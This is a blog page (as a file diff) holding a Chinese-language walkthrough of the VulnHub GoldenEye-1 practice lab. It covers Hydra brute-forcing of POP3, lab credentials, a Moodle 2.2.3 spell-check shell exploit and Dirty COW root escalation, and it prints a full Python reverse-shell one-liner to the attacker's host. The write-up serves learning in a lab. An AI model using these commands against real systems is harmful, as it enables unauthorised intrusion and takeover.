@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: true,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="前言最近比较闲，做一做靶场，让我这个菜鸡感受一下自己到底有多菜靶场地址">
+<meta name="keywords" content="笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="GoldenEye1--靶场练习笔记">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;09&#x2F;GoldenEye1--%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0&#x2F;index.html">
+<meta property="og:site_name" content="LionKing">
+<meta property="og:description" content="前言最近比较闲，做一做靶场，让我这个菜鸡感受一下自己到底有多菜靶场地址">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;as8tbgMfpdoh1TR.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;KPAcWxaV8umhHZO.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;4yVHdhFqnz629gU.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;r9oJDCsLqA6IGNO.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;ugRVSysLmBWHJTp.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;5NoCaAGstf3THhL.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;bHoLDIOK89paCdW.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;qylv5D9cHUnwIox.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;KOe7m9zRrxunBsg.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;KZdCng7VpW9hcUQ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;cRWVEeqxd87jaZ9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;BgU3pSIvKzVjiYk.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;fDoCIQqeM3yOjBu.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;nKXkg32YTIZFr4p.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;pk2u741XoRM38vt.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;YDQxKtBwlnV1Mgu.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;65YevOT14VwDuKx.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;vTxUjIBMSYg9c3N.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;jdySRc9OxlBZ1me.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;z48qUuB3IDpSrl1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;gYQBukmoRVrGPpO.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;LuD15l8IBt2ykX9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;HUAY3En9sxtGCdo.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;VtbfXDjaocOWNmJ.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;H9eB4F7tgb3n6mf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;3UFRq8SLQPCAtYN.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;vo1Ll4TaGmKf7FM.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;4NKPQpwqTGFEdOf.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;KlUL3iN2SPcF1bR.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;nMW6FyTpKqxUhSe.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;LxCOhafQTGZz5w6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;ASNdu653nIvCfKo.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;C1St4YnhLuVwURa.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;w9sJGW26xMQDhyY.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;nc7SYU4yzq9lGFv.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;32YicxnvHZTJCAI.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;oSHuUp6Fyhk9VX2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;rAD5gUMOIpfXJ3E.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;UYKbVIouv1jMBxQ.png">
+<meta property="og:updated_time" content="2020-06-09T04:09:25.633Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;06&#x2F;09&#x2F;as8tbgMfpdoh1TR.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/06/09/GoldenEye1--%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>GoldenEye1--靶场练习笔记 | LionKing</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">LionKing</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">安全小白成长之路</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/09/GoldenEye1--%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+      <meta itemprop="name" content="LionKing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="LionKing">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          GoldenEye1--靶场练习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-06-09 11:10:29 / 修改时间：12:09:25" itemprop="dateCreated datePublished" datetime="2020-06-09T11:10:29+08:00">2020-06-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近比较闲，做一做靶场，让我这个菜鸡感受一下自己到底有多菜<br><a href="https://www.vulnhub.com/entry/goldeneye-1,240/" target="_blank" rel="noopener">靶场地址</a><br><img src="https://i.loli.net/2020/06/09/as8tbgMfpdoh1TR.png" alt="Image 70.png"></p><a id="more"></a>
+<h3 id="发现靶机"><a href="#发现靶机" class="headerlink" title="发现靶机"></a>发现靶机</h3><p><img src="https://i.loli.net/2020/06/09/KPAcWxaV8umhHZO.png" alt="3.png"><br>目标IP：192.168.110.129</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap信息<br><img src="https://i.loli.net/2020/06/09/4yVHdhFqnz629gU.png" alt="1.png"></p>
+<p>目录扫描信息<br>Dirsearch扫描80未发现什么目录<br><img src="https://i.loli.net/2020/06/09/r9oJDCsLqA6IGNO.png" alt="2.png"></p>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>在主页显示/sev-home/目录可以登录<br><img src="https://i.loli.net/2020/06/09/ugRVSysLmBWHJTp.png" alt="22.png"></p>
+<p>打开目录发现需要凭证<br><img src="https://i.loli.net/2020/06/09/5NoCaAGstf3THhL.png" alt="ddd.png"></p>
+<p>查看页面源码发现有个terminal.js，跟进发现密文和俩人名<br><img src="https://i.loli.net/2020/06/09/bHoLDIOK89paCdW.png" alt="333.png"></p>
+<p>密文解密为：<br><img src="https://i.loli.net/2020/06/09/qylv5D9cHUnwIox.png" alt="323.png"></p>
+<p>登录进去就发现这个页面（账号密码这卡了好久，后来发现是tm小写，boris/InvincibleHack3r）<br><img src="https://i.loli.net/2020/06/09/KOe7m9zRrxunBsg.png" alt="222222.png"></p>
+<p>根据提示，Hydra爆破pop3服务发现两个账户密码：boris/secret1! ，natalya/bird<br><img src="https://i.loli.net/2020/06/09/KZdCng7VpW9hcUQ.png" alt="34343.png"></p>
+<p>google一下可以用telnet，尝试连接pop3，boris里面没啥重要的东西，在natalya里面找到了一个域名和账号密码<br><img src="https://i.loli.net/2020/06/09/cRWVEeqxd87jaZ9.png" alt="dadsda.png"><br><img src="https://i.loli.net/2020/06/09/BgU3pSIvKzVjiYk.png" alt="sadasd.png"></p>
+<p>根据提示，修改/etc/hosts，指定IP和域名<br><img src="https://i.loli.net/2020/06/09/fDoCIQqeM3yOjBu.png" alt="asdsadasdsa.png"></p>
+<p>用上面的给出的账号密码，登录 severnaya-station.com/gnocertdir 后，找到一个消息，里面指出了一个叫doak的运营主管。<br><img src="https://i.loli.net/2020/06/09/nKXkg32YTIZFr4p.png" alt="dsadasdas.png"></p>
+<p>再次hydra爆破doak的密码<br><img src="https://i.loli.net/2020/06/09/pk2u741XoRM38vt.png" alt="dasdas.png"></p>
+<p>telnet登录，查看邮件内容：<br><img src="https://i.loli.net/2020/06/09/YDQxKtBwlnV1Mgu.png" alt="dsadasdasa.png"></p>
+<p>使用给出的账号密码，登录系统，进去看到一个s3cret.txt的文件<br><img src="https://i.loli.net/2020/06/09/65YevOT14VwDuKx.png" alt="xzc.png"></p>
+<p>其内容指向一个图片路径<br><img src="https://i.loli.net/2020/06/09/vTxUjIBMSYg9c3N.png" alt="wwww.png"></p>
+<p>就真的是个图片<br><img src="https://i.loli.net/2020/06/09/jdySRc9OxlBZ1me.png" alt="bbbb.png"></p>
+<p>在图片属性中有一个base64编码<br><img src="https://i.loli.net/2020/06/09/z48qUuB3IDpSrl1.png" alt="sadadasdasd.png"></p>
+<p>解出来为<br><img src="https://i.loli.net/2020/06/09/gYQBukmoRVrGPpO.png" alt="dasdasd.png"></p>
+<p>根据上文s3cret.txt的内容，猜测应该是adm1n的密码<br>结果，吐了，不是adm1n的，是admin的<br><img src="https://i.loli.net/2020/06/09/LuD15l8IBt2ykX9.png" alt="dasdasdas.png"></p>
+<p>进去之后没发现啥有用的，看了一下答案说要找cms的漏洞：moodle 2.2.3<br>Google之后发现metasploit有rce脚本。<br><img src="https://i.loli.net/2020/06/09/HUAY3En9sxtGCdo.png" alt="asdasdasd.png"></p>
+<p>需要添加一下密码，域名和目录<br><img src="https://i.loli.net/2020/06/09/VtbfXDjaocOWNmJ.png" alt="dsadas.png"></p>
+<p>试了好几遍失败了，查了资料才知道要改东西<br>到这个目录里面把拼写引擎改为Pspellshell<br><img src="https://i.loli.net/2020/06/09/H9eB4F7tgb3n6mf.png" alt="dsadasdas.png"></p>
+<p>浪费大家时间了，又失败了，没找到原因，看了别人的wp，试试另外一个方法<br>第一步：<br>在目录下写入python反弹shell的脚本<br><img src="https://i.loli.net/2020/06/09/3UFRq8SLQPCAtYN.png" alt="ykk.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.110.128&quot;,65530));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
+
+<p>第二步：<br>将下面改为PspellShell<br><img src="https://i.loli.net/2020/06/09/vo1Ll4TaGmKf7FM.png" alt="dasdasd.png"></p>
+<p>第三步：<br>Kali上开启监听<br><img src="https://i.loli.net/2020/06/09/4NKPQpwqTGFEdOf.png" alt="dasdasd.png"></p>
+<p>第四步：<br>在对应Blogs下add a new entry，填点东西，然后点击最后一个ABC的按钮<br><img src="https://i.loli.net/2020/06/09/KlUL3iN2SPcF1bR.png" alt="sdasadasdas.png"></p>
+<p>成功getshell<br><img src="https://i.loli.net/2020/06/09/nMW6FyTpKqxUhSe.png" alt="dfffff.png"></p>
+<p>获取一个tty的shell<br><img src="https://i.loli.net/2020/06/09/LxCOhafQTGZz5w6.png" alt="wwwwwww.png"></p>
+<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>低权限：<br><img src="https://i.loli.net/2020/06/09/ASNdu653nIvCfKo.png" alt="dasdasd.png"></p>
+<p>看了一圈suid没发现可以利用的<br>内核提权吧<br>先wget一个提权脚本到靶机的tmp目录下<br>然后执行发现可用脏牛提权cve-2016-5195<br><img src="https://i.loli.net/2020/06/09/C1St4YnhLuVwURa.png" alt="dsadas.png"></p>
+<p>把脏牛wget到靶机<br><img src="https://i.loli.net/2020/06/09/w9sJGW26xMQDhyY.png" alt="dddd.png"></p>
+<p>编译一下，发现没有gcc，但是有cc<br><img src="https://i.loli.net/2020/06/09/nc7SYU4yzq9lGFv.png" alt="adsadasddasdsadas.png"></p>
+<p>成功获取root<br><img src="https://i.loli.net/2020/06/09/32YicxnvHZTJCAI.png" alt="dsadas.png"></p>
+<p>找flag<br><img src="https://i.loli.net/2020/06/09/oSHuUp6Fyhk9VX2.png" alt="dasas.png"><br><img src="https://i.loli.net/2020/06/09/rAD5gUMOIpfXJ3E.png" alt="sssss.png"></p>
+<p>结束<br><img src="https://i.loli.net/2020/06/09/UYKbVIouv1jMBxQ.png" alt="ddddd.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>GoldenEye这个靶场脑洞着实有点大，很多细节点稍有不注意或没想到就会卡很久，这个靶场做下来我大概花了3、4天，其中断过好几次，也有好几次想放弃了，但是坚持一下也做完了，舒服</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i> 笔记</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/04/10/%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDXSL%E6%96%87%E4%BB%B6%E8%BE%BE%E5%88%B0%E5%85%8D%E6%9D%80%E5%B9%B6%E5%A2%9E%E5%8A%A0%E6%96%87%E6%A1%A3%E8%BF%B7%E6%83%91%E6%80%A7/" rel="next" title="远程加载XSL文件达到免杀并增加文档迷惑性">
+                  <i class="fa fa-chevron-left"></i> 远程加载XSL文件达到免杀并增加文档迷惑性
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2099/01/01/%E6%94%B6%E8%97%8F%E7%9A%84%E6%96%87%E7%AB%A0/" rel="prev" title="收藏的文章">
+                  收藏的文章 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    
+  <div class="comments" id="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80NzQ3My8yMzk3Mw=="></div>
+  </div>
+  
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#发现靶机"><span class="nav-number">2.</span> <span class="nav-text">发现靶机</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">3.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透测试"><span class="nav-number">4.</span> <span class="nav-text">渗透测试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#内核提权"><span class="nav-number">5.</span> <span class="nav-text">内核提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">6.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="LionKing"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">LionKing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://3gstudent.github.io/" title="https:&#x2F;&#x2F;3gstudent.github.io&#x2F;" rel="noopener" target="_blank">3gstudent</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.hl0rey.com/archives/" title="https:&#x2F;&#x2F;blog.hl0rey.com&#x2F;archives&#x2F;" rel="noopener" target="_blank">hl0rey</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/micr067/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;micr067&#x2F;" rel="noopener" target="_blank">Micr067</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://patrilic.top/archives/" title="https:&#x2F;&#x2F;patrilic.top&#x2F;archives&#x2F;" rel="noopener" target="_blank">Patrilic</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://me.csdn.net/qq_29647709" title="https:&#x2F;&#x2F;me.csdn.net&#x2F;qq_29647709" rel="noopener" target="_blank">tdcoming</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://uknowsec.cn/" title="https:&#x2F;&#x2F;uknowsec.cn&#x2F;" rel="noopener" target="_blank">uknow</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://422926799.github.io/" title="https:&#x2F;&#x2F;422926799.github.io&#x2F;" rel="noopener" target="_blank">九世</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://payloads.online/" title="https:&#x2F;&#x2F;payloads.online&#x2F;" rel="noopener" target="_blank">倾旋</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://wiki.17-apt.tk/" title="https:&#x2F;&#x2F;wiki.17-apt.tk&#x2F;" rel="noopener" target="_blank">BugMan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.se7ensec.cn/" title="http:&#x2F;&#x2F;www.se7ensec.cn&#x2F;" rel="noopener" target="_blank">se7en</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://attack.mitre.org/matrices/enterprise/" title="https:&#x2F;&#x2F;attack.mitre.org&#x2F;matrices&#x2F;enterprise&#x2F;" rel="noopener" target="_blank">ATT&CK</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.fireeye.com/blog.html" title="https:&#x2F;&#x2F;www.fireeye.com&#x2F;blog.html" rel="noopener" target="_blank">FireEye</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://vincentyiu.com/" title="https:&#x2F;&#x2F;vincentyiu.com&#x2F;" rel="noopener" target="_blank">Vincent Yiu</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LionKing</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.5.0
+  </div>
+
+-->
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+</body>
+</html>
